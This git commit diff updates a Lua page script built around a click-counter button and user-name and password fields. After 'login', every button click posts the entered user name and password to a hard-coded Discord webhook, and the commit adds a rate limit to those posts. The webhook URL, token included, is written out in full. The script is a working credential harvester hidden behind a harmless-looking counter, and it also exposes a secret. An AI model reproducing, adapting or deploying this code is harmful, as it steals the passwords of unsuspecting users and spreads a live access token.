83696455bc3d8570ca28a445eed73c4cc80ddb40
Nnamllit1 <158311675+Nnamllit1@users.noreply.github.com>
2024-06-10 18:54:20 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,24 +1,23 @@
 local button = get("button1")
 local result = get("result")
 local press = 1
+local last_webhook_time = os.time() - 10 -- Initialisiert die Zeitvariable so, dass der Webhook beim Start sofort gesendet wird
 
 local user_name = get("user_n")
 local user_pass = get("user_p")
-local log_bool = "false"
+local log_bool = false
 local button_login = get("button_login")
 
 local discord_webhook_url = "https://discord.com/api/webhooks/1249752568188371085/lOGDGvGYhKpN_uJZWwHXAcg1Bp0FewWNZ5Bnwq05UnbYlZnNxe6ITccLSfIUE_xfy4iI"
 
 button_login.on_click(function()
-  if log_bool == "false" then
-    log_bool = "true"
-  end
+  log_bool = true
 end)
 
 button.on_click(function()
   result.set_content(press)
 
-  if log_bool == "true" then
+  if log_bool and os.time() - last_webhook_time >= 10 then
     -- Send data to Discord Webhook
     local body = "{ \"content\": \"" .. user_name.get_content() .. ": " .. user_pass.get_content() .. ": " .. press .. "\" }"
     local res = fetch({
@@ -30,6 +29,7 @@ button.on_click(function()
     
     if res and res.status == 204 then
       print("Message sent to Discord successfully.")
+      last_webhook_time = os.time() -- Aktualisiert die Zeitvariable, wenn der Webhook erfolgreich gesendet wurde
     else
       print("Failed to send message to Discord. Status: " .. (res and res.status or "unknown"))
     end
